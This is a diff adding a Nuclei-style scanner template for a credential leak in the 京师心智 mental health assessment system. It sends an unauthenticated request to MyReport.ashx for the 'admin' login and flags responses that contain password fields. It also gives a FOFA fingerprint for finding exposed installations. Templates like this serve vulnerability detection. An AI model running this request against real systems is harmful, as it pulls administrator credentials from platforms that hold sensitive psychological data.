@@ -1,0 +1,27 @@
+id: jingshixinzhi-MHAS-MyReport-infoleak
+
+info:
+  name: jingshixinzhi-MHAS-MyReport-infoleak
+  author: linfeng7z
+  severity: high
+  description: 京师心智心理健康测评系统 MyReport.ashx接口存在信息泄露漏洞，未经身份验证的攻击者可以利用此漏洞获取系统后台管理员账户密码凭证，并且解密后可登录后台页面，使系统处于极不安全的状态。
+  tags: jingshixinzhi,infoleak
+  metadata:
+    fofa-qeury: body="JS/ligerComboBox/ligerTree.js"
+    veified: true
+
+http:
+  - raw:
+      - |
+        GET /FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body, 'loginname') && contains(body, 'password')"
+          - "status_code == 200"
+        condition: and
